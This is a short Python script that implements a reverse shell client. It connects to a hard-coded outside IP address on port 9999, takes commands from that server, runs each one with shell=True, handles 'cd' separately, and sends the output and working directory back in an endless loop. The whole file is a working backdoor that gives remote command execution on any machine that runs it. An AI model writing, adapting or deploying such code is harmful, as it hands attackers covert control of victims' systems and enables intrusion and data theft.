import socket
import os
import subprocess

# Function that will attempt to connect client to server
def connect_to_server(server_host, server_port):
    try:
        s = socket.socket()
        s.connect((server_host, server_port))
        return s
    except Exception as e:
        print("Error connecting to the server:", e)
        exit(1)

#Function for receiving command from server side
def receive_command(s):
    try:
        data= s.recv(1024)
        return data
    except Exception as e:
        print("Error receiving command from server:", e)
        return b''

def execute_command(command):
    try:
        # If the received'cd', change the current directory
        if command[:2].decode("utf-8") == 'cd':
            os.chdir(command[3:].decode("utf-8"))

        # Execute the command using subprocess.Popen
        cmd = subprocess.Popen(command[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Read the output and error of the command
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        
        # Convert to a string
        output_str = str(output_byte, "utf-8")

        # Get the current directory
        currentWD = os.getcwd() + "> "

        # Return the command output
        return output_str + currentWD

    except Exception as e:
        print("Error executing command:", e)
        return ""

# Function that will respond to server by sending output of executed command
def send_response(s, response):
    try:
        s.send(str.encode(response))
    except Exception as e:
        print("Error sending response to server:", e)

#Function closes the connection
def close_connection(s):
    try:
        s.close()
    except Exception as e:
        print("Error closing socket:", e)


if __name__ == "__main__":
    # Define server's IP address and port
    server_host = '104.236.209.167'
    server_port = 9999

    # Connect to the server
    client_socket = connect_to_server(server_host, server_port)

    # Main loop to continuously receive and execute commands from the server
    while True:
        # Receive command from the server
        command = receive_command(client_socket)
        #Break out of infinite loop if empty string received
        if not command:
                print ("Server has terminated the connection.")
                break

        # Execute the command and get the response
        response = execute_command(command)

        # Send the response back to the server
        send_response(client_socket, response)

    # Close the connection
    close_connection(client_socket)
